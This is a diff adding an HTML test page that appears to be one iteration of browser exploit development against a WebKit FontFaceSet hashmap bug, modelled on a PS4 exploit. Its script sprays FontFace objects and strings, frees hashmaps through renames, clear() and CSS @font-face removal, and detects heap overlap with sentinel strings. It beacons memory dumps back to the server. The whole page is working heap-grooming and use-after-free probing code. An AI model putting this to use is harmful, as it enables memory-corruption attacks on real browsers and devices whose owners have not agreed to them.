@@ -1,0 +1,192 @@
+<!--
+  p618: FontFaceSet hashmap string overlap v2.
+
+  Changes from p617:
+  - 4096 fonts (matching PS4 exploit)
+  - Create probe strings AFTER each font rename (to reclaim freed hashmap)
+  - Test more bucket sizes including larger ones
+  - Also try: clear() the FontFaceSet, then allocate strings
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p618</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent('P618-'+m)+'&t='+Date.now(),false);x.send();}catch(e){}}
+
+function ptrToString(p){
+  var s='';
+  for(var i=0;i<8;i++){
+    s+=String.fromCharCode(p%256);
+    p=(p-p%256)/256;
+  }
+  return s;
+}
+function stringToPtr(s,o){
+  if(o===undefined)o=0;
+  var ans=0;
+  for(var i=7;i>=0;i--)
+    ans=256*ans+s.charCodeAt(o+i);
+  return ans;
+}
+
+var STRING_OFFSET=20;
+var string_id=10000000;
+var string_atomifier={};
+var strings=[];
+
+function mkString(l,head){
+  var s=head+'\u0000'.repeat(Math.max(0,l-STRING_OFFSET-8-head.length))+(string_id++);
+  string_atomifier[s]=1;
+  strings.push(s);
+  return s;
+}
+
+function main(){
+b('BOOT');
+
+// === APPROACH A: Replicate sleirsgoevy with 4096 fonts ===
+var SPRAY_FONTS=4096;
+var HASHMAP_BUCKET=208; // PS4 value
+
+try{
+  var bad_fonts=[];
+  for(var i=0;i<SPRAY_FONTS;i++){
+    bad_fonts.push(new FontFace('font'+i,'local(Arial)',{}));
+  }
+  b('FONTS:'+bad_fonts.length);
+
+  // Sentinel content
+  var sentinel=ptrToString(0xDEADBEEF12345678);
+
+  // Pre-spray strings (fill free list)
+  for(var i=0;i<256;i++){
+    mkString(HASHMAP_BUCKET,sentinel);
+  }
+  b('PRESTRINGS:'+strings.length);
+
+  // Create FontFaceSet with all fonts
+  var ffs=new FontFaceSet(bad_fonts);
+  b('FFS:size='+ffs.size);
+
+  // Create probe string
+  var probe=mkString(HASHMAP_BUCKET,sentinel);
+
+  // Mutate fonts one by one, check probe after each
+  var overlap_found=false;
+  for(var i=0;i<SPRAY_FONTS&&!overlap_found;i++){
+    bad_fonts[i].family='evil'+i;
+    if(probe.substr(0,sentinel.length)!==sentinel){
+      b('OVERLAP-A:font='+i);
+      // Dump first 32 chars as hex
+      var dump='';
+      for(var j=0;j<Math.min(32,probe.length);j++){
+        dump+=('0000'+probe.charCodeAt(j).toString(16)).slice(-4);
+      }
+      b('DUMP-A:'+dump.substring(0,500));
+      overlap_found=true;
+    }
+  }
+  if(!overlap_found) b('NO-OVERLAP-A:bucket='+HASHMAP_BUCKET);
+}catch(e){
+  b('A-ERR:'+e.message);
+}
+
+// === APPROACH B: Try different bucket sizes with same 4096 fonts ===
+var SIZES=[128,144,160,176,192,224,256,288,320,384,448,512];
+
+for(var si=0;si<SIZES.length;si++){
+  var SZ=SIZES[si];
+  try{
+    var fonts2=[];
+    for(var i=0;i<512;i++){
+      fonts2.push(new FontFace('b'+si+'f'+i,'local(Arial)',{}));
+    }
+    // Pre-spray
+    for(var i=0;i<64;i++) mkString(SZ,sentinel);
+
+    var ffs2=new FontFaceSet(fonts2);
+    var probe2=mkString(SZ,sentinel);
+
+    var found2=false;
+    for(var i=0;i<512&&!found2;i++){
+      fonts2[i].family='x'+si+'_'+i;
+      if(probe2.substr(0,sentinel.length)!==sentinel){
+        b('OVERLAP-B:sz='+SZ+',font='+i);
+        found2=true;
+      }
+    }
+    if(!found2) b('NO-B:'+SZ);
+  }catch(e){
+    b('B-'+SZ+':ERR:'+e.message.substring(0,100));
+  }
+}
+
+// === APPROACH C: Create string AFTER clear/delete ===
+try{
+  var fonts3=[];
+  for(var i=0;i<1024;i++){
+    fonts3.push(new FontFace('c_f'+i,'local(Arial)',{}));
+  }
+  var ffs3=new FontFaceSet(fonts3);
+  b('FFS3:size='+ffs3.size);
+
+  // Clear the set (frees internal hashmap data)
+  ffs3.clear();
+  b('FFS3-CLEARED:size='+ffs3.size);
+
+  // Now spray strings to reclaim freed hashmap
+  var postClearStrings=[];
+  for(var sz=64;sz<=1024;sz+=16){
+    var s=mkString(sz,sentinel);
+    if(s.substr(0,sentinel.length)!==sentinel){
+      b('OVERLAP-C:sz='+sz);
+      postClearStrings.push({sz:sz,s:s});
+    }
+  }
+  if(postClearStrings.length===0) b('NO-OVERLAP-C');
+}catch(e){
+  b('C-ERR:'+e.message);
+}
+
+// === APPROACH D: Use document.fonts + CSS @font-face ===
+try{
+  // Create many @font-face rules via style element
+  var style=document.createElement('style');
+  var css='';
+  for(var i=0;i<256;i++){
+    css+='@font-face{font-family:df'+i+';src:local(Arial);}\n';
+  }
+  style.textContent=css;
+  document.head.appendChild(style);
+  b('CSS-FONTS:'+document.fonts.size);
+
+  // Remove the style → CSSFontFace objects should be freed
+  style.remove();
+  document.body.offsetHeight; // force layout
+  b('CSS-AFTER-REMOVE:'+document.fonts.size);
+
+  // Spray strings of CSSFontFace size (192)
+  var postRemoveHit=false;
+  for(var i=0;i<512;i++){
+    var s=mkString(192,sentinel);
+    if(s.substr(0,sentinel.length)!==sentinel){
+      b('OVERLAP-D:i='+i);
+      var dump='';
+      for(var j=0;j<Math.min(48,s.length);j++){
+        dump+=('0000'+s.charCodeAt(j).toString(16)).slice(-4);
+      }
+      b('DUMP-D:'+dump.substring(0,500));
+      postRemoveHit=true;
+      break;
+    }
+  }
+  if(!postRemoveHit) b('NO-OVERLAP-D');
+}catch(e){
+  b('D-ERR:'+e.message);
+}
+
+b('DONE');
+}
+
+setTimeout(main,0);
+</script></head><body>p618</body></html>
